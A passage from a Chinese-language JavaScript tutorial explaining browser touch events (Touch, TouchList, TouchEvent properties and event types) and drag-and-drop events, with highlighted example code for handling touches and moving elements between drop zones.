<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchstart&#x27;</span>, rotate);</span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchmove&#x27;</span>, rotate);</span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchend&#x27;</span>, rotate);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">rotate</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> touch = e.<span class="property">changedTouches</span>.<span class="title function_">item</span>(<span class="number">0</span>);</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line"></span><br><span class="line">  src.<span class="property">style</span>.<span class="property">width</span> = touch.<span class="property">radiusX</span> * <span class="number">2</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">  src.<span class="property">style</span>.<span class="property">height</span> = touch.<span class="property">radiusY</span> * <span class="number">2</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">  src.<span class="property">style</span>.<span class="property">transform</span> = <span class="string">&#x27;rotate(&#x27;</span> + touch.<span class="property">rotationAngle</span> + <span class="string">&#x27;deg)&#x27;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h5 id="（4）Touch-force-触摸压力"><a href="#（4）Touch-force-触摸压力" class="headerlink" title="（4）Touch.force 触摸压力"></a>（4）Touch.force 触摸压力</h5><p><code>Touch.force</code>属性返回一个<code>0</code>到<code>1</code>之间的数值，表示触摸压力。<code>0</code>代表没有压力，<code>1</code>代表硬件所能识别的最大压力。</p>
<h5 id="（5）Touch-target-开始触摸时的元素"><a href="#（5）Touch-target-开始触摸时的元素" class="headerlink" title="（5）Touch.target 开始触摸时的元素"></a>（5）Touch.target 开始触摸时的元素</h5><p><code>Touch.target</code>属性返回一个元素节点，代表触摸发生时所在的那个元素节点。即使触摸点已经离开了这个节点，该属性依然不变。</p>
<h3 id="3、TouchList-接口"><a href="#3、TouchList-接口" class="headerlink" title="3、TouchList 接口"></a>3、TouchList 接口</h3><p><code>TouchList</code>接口<strong>表示一组触摸点的集合</strong>。它的实例是一个<strong>类似数组的对象</strong>，成员是<code>Touch</code>的实例对象，表示所有触摸点。用户用三根手指触摸，产生的<code>TouchList</code>实例就会包含三个成员，每根手指的触摸点对应一个<code>Touch</code>实例对象。</p>
<p>它的实例主要通过触摸事件的<code>TouchEvent.touches</code>、<code>TouchEvent.changedTouches</code>、<code>TouchEvent.targetTouches</code>这几个属性获取。</p>
<p>它的实例属性和实例方法只有两个。</p>
<ul>
<li><code>TouchList.length</code>：数值，表示成员数量（即触摸点的数量）。</li>
<li><code>TouchList.item()</code>：返回指定位置的成员，它的参数是该成员的位置编号（从零开始）。</li>
</ul>
<h3 id="4、TouchEvent-接口"><a href="#4、TouchEvent-接口" class="headerlink" title="4、TouchEvent 接口"></a>4、TouchEvent 接口</h3><h4 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h4><p>TouchEvent 接口<strong>继承了 Event 接口</strong>，表示由<strong>触摸引发的事件实例</strong>，通常来自触摸屏或轨迹板。除了被继承的属性以外，它还有一些自己的属性。</p>
<p>浏览器原生提供<code>TouchEvent()</code>构造函数，用来生成触摸事件的实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">TouchEvent</span>(type, options)</span><br></pre></td></tr></table></figure>

<p><code>TouchEvent()</code>构造函数可以接受两个参数，第一个参数是字符串，表示事件类型；第二个参数是事件的配置对象，该参数是可选的，对象的所有属性也是可选的。除了<code>Event</code>接口的配置属性，该接口还有一些自己的配置属性。</p>
<ul>
<li><code>touches</code>：<code>TouchList</code>实例，代表所有的当前处于活跃状态的触摸点，默认值是一个空数组<code>[]</code>。</li>
<li><code>targetTouches</code>：<code>TouchList</code>实例，代表所有处在触摸的目标元素节点内部、且仍然处于活动状态的触摸点，默认值是一个空数组<code>[]</code>。</li>
<li><code>changedTouches</code>：<code>TouchList</code>实例，代表本次触摸事件的相关触摸点，默认值是一个空数组<code>[]</code>。</li>
<li><code>ctrlKey</code>：布尔值，表示 Ctrl 键是否同时按下，默认值为<code>false</code>。</li>
<li><code>shiftKey</code>：布尔值，表示 Shift 键是否同时按下，默认值为<code>false</code>。</li>
<li><code>altKey</code>：布尔值，表示 Alt 键是否同时按下，默认值为<code>false</code>。</li>
<li><code>metaKey</code>：布尔值，表示 Meta 键（或 Windows 键）是否同时按下，默认值为<code>false</code>。</li>
</ul>
<h4 id="4-2-实例属性"><a href="#4-2-实例属性" class="headerlink" title="4.2 实例属性"></a>4.2 实例属性</h4><p>TouchEvent 接口的实例具有<code>Event</code>实例的所有属性和方法，此外还有一些它自己的实例属性，这些属性全部都是只读。</p>
<h5 id="（1）TouchEvent-altKey，TouchEvent-ctrlKey，TouchEvent-shiftKey，TouchEvent-metaKey-（是否同时按某些功能键）"><a href="#（1）TouchEvent-altKey，TouchEvent-ctrlKey，TouchEvent-shiftKey，TouchEvent-metaKey-（是否同时按某些功能键）" class="headerlink" title="（1）TouchEvent.altKey，TouchEvent.ctrlKey，TouchEvent.shiftKey，TouchEvent.metaKey （是否同时按某些功能键）"></a>（1）TouchEvent.altKey，TouchEvent.ctrlKey，TouchEvent.shiftKey，TouchEvent.metaKey （是否同时按某些功能键）</h5><ul>
<li><code>TouchEvent.altKey</code>：布尔值，表示触摸时是否按下了 Alt 键。</li>
<li><code>TouchEvent.ctrlKey</code>：布尔值，表示触摸时是否按下了 Ctrl 键。</li>
<li><code>TouchEvent.shiftKey</code>：布尔值：表示触摸时是否按下了 Shift 键。</li>
<li><code>TouchEvent.metaKey</code>：布尔值，表示触摸时是否按下了 Meta 键（或 Windows 键）。</li>
</ul>
<p>下面是一个示例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">someElement.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchstart&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;altKey = &#x27;</span> + e.<span class="property">altKey</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ctrlKey = &#x27;</span> + e.<span class="property">ctrlKey</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;metaKey = &#x27;</span> + e.<span class="property">metaKey</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;shiftKey = &#x27;</span> + e.<span class="property">shiftKey</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>



<h5 id="（2）TouchEvent-changedTouches-（触摸点集合，不同触摸事件，含义不同）"><a href="#（2）TouchEvent-changedTouches-（触摸点集合，不同触摸事件，含义不同）" class="headerlink" title="（2）TouchEvent.changedTouches （触摸点集合，不同触摸事件，含义不同）"></a>（2）TouchEvent.changedTouches （触摸点集合，不同触摸事件，含义不同）</h5><p><code>TouchEvent.changedTouches</code>属性返回一个<code>TouchList</code>实例，成员是一组<code>Touch</code>实例对象，表示本次触摸事件的相关触摸点。</p>
<p>对于<strong>不同的事件，该属性的含义有所不同。</strong></p>
<ul>
<li><code>touchstart</code>事件：被激活的触摸点</li>
<li><code>touchmove</code>事件：发生变化的触摸点</li>
<li><code>touchend</code>事件：消失的触摸点（即不再被触碰的点）</li>
</ul>
<p>下面是一个示例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">someElement.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchmove&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.<span class="property">changedTouches</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">changedTouches</span>[i].<span class="property">identifier</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>



<h5 id="（3）TouchEvent-touches-（仍然活动的触摸点集合）"><a href="#（3）TouchEvent-touches-（仍然活动的触摸点集合）" class="headerlink" title="（3）TouchEvent.touches （仍然活动的触摸点集合）"></a>（3）TouchEvent.touches （仍然活动的触摸点集合）</h5><p><code>TouchEvent.touches</code>属性返回一个<code>TouchList</code>实例，成员是所有<strong>仍然处于活动状态（即触摸中）的触摸点</strong>。一般来说，一个手指就是一个触摸点。</p>
<p>下面是一个示例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">someElement.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchstart&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (e.<span class="property">touches</span>.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="comment">// 一根手指触摸</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="title function_">handle_one_touch</span>(e); <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 两根手指触摸</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="title function_">handle_two_touches</span>(e); <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 三根手指触摸</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: <span class="title function_">handle_three_touches</span>(e); <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 其他情况</span></span><br><span class="line">    <span class="attr">default</span>: <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Not supported&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>



<h5 id="（4）TouchEvent-targetTouches-（目标元素内活动的触摸点集合）"><a href="#（4）TouchEvent-targetTouches-（目标元素内活动的触摸点集合）" class="headerlink" title="（4）TouchEvent.targetTouches （目标元素内活动的触摸点集合）"></a>（4）TouchEvent.targetTouches （目标元素内活动的触摸点集合）</h5><p><code>TouchEvent.targetTouches</code>属性返回一个<code>TouchList</code>实例，成员是<strong>触摸事件的目标元素节点内部、所有仍然处于活动状态（即触摸中）的触摸点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">touches_in_target</span>(<span class="params">ev</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (ev.<span class="property">touches</span>.<span class="property">length</span> === ev.<span class="property">targetTouches</span>.<span class="property">length</span> ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码用来判断，是否所有触摸点都在目标元素内。</p>
<h3 id="5、触摸事件的种类"><a href="#5、触摸事件的种类" class="headerlink" title="5、触摸事件的种类"></a>5、触摸事件的种类</h3><p>触摸引发的事件，有以下几种。可以通过<code>TouchEvent.type</code>属性，查看到底发生的是哪一种事件。</p>
<ul>
<li><code>touchstart</code>：用户开始触摸时触发，它的<code>target</code>属性返回发生触摸的元素节点。<strong>【开始触摸】</strong></li>
<li><code>touchend</code>：用户不再接触触摸屏时（或者移出屏幕边缘时）触发，它的<code>target</code>属性与<code>touchstart</code>事件一致的，就是开始触摸时所在的元素节点。它的<code>changedTouches</code>属性返回一个<code>TouchList</code>实例，包含所有不再触摸的触摸点（即<code>Touch</code>实例对象）。<strong>【触摸结束】</strong></li>
<li><code>touchmove</code>：用户移动触摸点时触发，它的<code>target</code>属性与<code>touchstart</code>事件一致。如果触摸的半径、角度、力度发生变化，也会触发该事件。<strong>【触摸移动中】</strong></li>
<li><code>touchcancel</code>：触摸点取消时触发，比如在触摸区域跳出一个模态窗口（modal window）、触摸点离开了文档区域（进入浏览器菜单栏）、用户的触摸点太多，超过了支持的上限（自动取消早先的触摸点）。<strong>【触摸点被取消】</strong></li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;canvas&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">el.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchstart&#x27;</span>, handleStart, <span class="literal">false</span>);</span><br><span class="line">el.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchmove&#x27;</span>, handleMove, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleStart</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">  evt.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="keyword">var</span> touches = evt.<span class="property">changedTouches</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; touches.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(touches[i].<span class="property">pageX</span>, touches[i].<span class="property">pageY</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleMove</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">  evt.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="keyword">var</span> touches = evt.<span class="property">changedTouches</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; touches.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> touch = touches[i];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(touch.<span class="property">pageX</span>, touch.<span class="property">pageY</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="九、拖拉事件"><a href="#九、拖拉事件" class="headerlink" title="九、拖拉事件"></a>九、拖拉事件</h2><h3 id="1、拖拉事件的种类"><a href="#1、拖拉事件的种类" class="headerlink" title="1、拖拉事件的种类"></a>1、拖拉事件的种类</h3><p>拖拉（drag）指的是，<strong>用户在某个对象上按下鼠标键不放，拖动它到另一个位置，然后释放鼠标键，将该对象放在那里</strong>。</p>
<p>拖拉的对象有好几种，包括<strong>元素节点、图片、链接、选中的文字等等</strong>。在网页中，除了元素节点默认不可以拖拉，其他（图片、链接、选中的文字）都是可以直接拖拉的。为了让元素节点可拖拉，可以将该节点的<code>draggable</code>属性设为<code>true</code>。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">  此区域可拖拉</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>draggable</code>属性<strong>可用于任何元素节点</strong>，但是图片（<code> &lt;img&gt; </code>）和链接（<code> &lt;a&gt; </code>）不加这个属性，就可以拖拉。对于它们，用到这个属性的时候，往往是将其设为<code>false</code>，防止拖拉这两种元素。</p>
<p><strong>注意</strong>，一旦某个元素节点的<code>draggable</code>属性设为<code>true</code>，<strong>就无法再用鼠标选中该节点内部的文字或子节点</strong>了。</p>
<p>当元素节点或选中的文本被拖拉时，就<strong>会持续触发拖拉事件</strong>，包括以下一些事件。</p>
<p><strong>拖拉的节点上触发：</strong></p>
<ul>
<li><code>drag</code>：<strong>拖拉过程中</strong>，在被拖拉的节点上<strong>持续触发</strong>（相隔几百毫秒）。</li>
<li><code>dragstart</code>：用户<strong>开始拖拉时</strong>，在被拖拉的节点上触发，该事件的<code>target</code>属性是被拖拉的节点。通常应该在这个事件的监听函数中，指定拖拉的数据。</li>
<li><code>dragend</code>：<strong>拖拉结束时</strong>（释放鼠标键或按下 ESC 键）在被拖拉的节点上触发，该事件的<code>target</code>属性是被拖拉的节点。它与<code>dragstart</code>事件，在同一个节点上触发。不管拖拉是否跨窗口，或者中途被取消，<code>dragend</code>事件总是会触发的。</li>
</ul>
<p><strong>拖拉到别的节点上触发：</strong></p>
<ul>
<li><p><code>dragenter</code>：<strong>拖拉进入当前节点</strong>时，<strong>在当前节点上触发一次</strong>，该事件的<code>target</code>属性是当前节点。通常应该在这个事件的监听函数中，<strong>指定是否允许在当前节点放下（drop）拖拉的数据</strong>。如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。</p>
</li>
<li><p><code>dragover</code>：<strong>拖拉到当前节点上方时</strong>，在当前节点上<strong>持续触发</strong>（相隔几百毫秒），该事件的<code>target</code>属性是当前节点。该事件与<code>dragenter</code>事件的区别是，<code>dragenter</code>事件在进入该节点时触发，然后只要没有离开这个节点，<code>dragover</code>事件会持续触发。</p>
</li>
<li><p><code>dragleave</code>：<strong>拖拉操作离开当前节点范围时</strong>，在当前节点上触发，该事件的<code>target</code>属性是当前节点。如果要在视觉上显示拖拉离开操作当前节点，就在这个事件的监听函数中设置。</p>
</li>
<li><p><code>drop</code>：被拖拉的节点或选中的文本，<strong>释放到目标节点时，在目标节点上触发</strong>。注意，如果当前节点不允许<code>drop</code>，即使在该节点上方松开鼠标键，也不会触发该事件。如果用户按下 ESC 键，取消这个操作，也不会触发该事件。该事件的监听函数负责取出拖拉数据，并进行相关处理。</p>
</li>
</ul>
<p>下面的例子展示，如何动态改变被拖动节点的背景色。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragstart&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragend&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>div</code>节点被拖动时，背景色会变为红色，拖动结束，又变回绿色。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div1&quot;</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    div1，此区域可拖拉</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div2&quot;</span>&gt;</span></span><br><span class="line">    div2</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> div1 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.div1&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> div2 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.div2&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    div1.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragstart&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;开始拖拉&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    div1.<span class="title function_">addEventListener</span>(<span class="string">&#x27;drag&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;拖拉中&#x27;</span>) <span class="comment">// 持续触发</span></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    div1.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragend&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;结束拖拉&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    div2.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragenter&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;拖到了div2&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    div2.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragover&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//console.log(&#x27;正在div2上方&#x27;) // 持续触发</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    div2.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragleave&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;离开div2&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    div2.<span class="title function_">addEventListener</span>(<span class="string">&#x27;drop&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;在div2上释放&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>下面是一个例子，展示如何实现将一个节点从当前父节点，拖拉到另一个父节点中。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment"> &lt;div class=&quot;dropzone&quot;&gt;</span></span><br><span class="line"><span class="comment">   &lt;div id=&quot;draggable&quot; draggable=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="comment">     该节点可拖拉</span></span><br><span class="line"><span class="comment">   &lt;/div&gt;</span></span><br><span class="line"><span class="comment"> &lt;/div&gt;</span></span><br><span class="line"><span class="comment"> &lt;div class=&quot;dropzone&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment"> &lt;div class=&quot;dropzone&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment"> &lt;div class=&quot;dropzone&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 被拖拉节点</span></span><br><span class="line"><span class="keyword">var</span> dragged;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragstart&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 保存被拖拉节点</span></span><br><span class="line">  dragged = event.<span class="property">target</span>;</span><br><span class="line">  <span class="comment">// 被拖拉节点的背景色变透明</span></span><br><span class="line">  event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">opacity</span> = <span class="number">0.5</span>;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragend&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 被拖拉节点的背景色恢复正常</span></span><br><span class="line">  event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragover&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 防止拖拉效果被重置，允许被拖拉的节点放入目标节点</span></span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragenter&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 目标节点的背景色变紫色</span></span><br><span class="line">  <span class="comment">// 由于该事件会冒泡，所以要过滤节点</span></span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">target</span>.<span class="property">className</span> === <span class="string">&#x27;dropzone&#x27;</span>) &#123;</span><br><span class="line">    event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;purple&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, 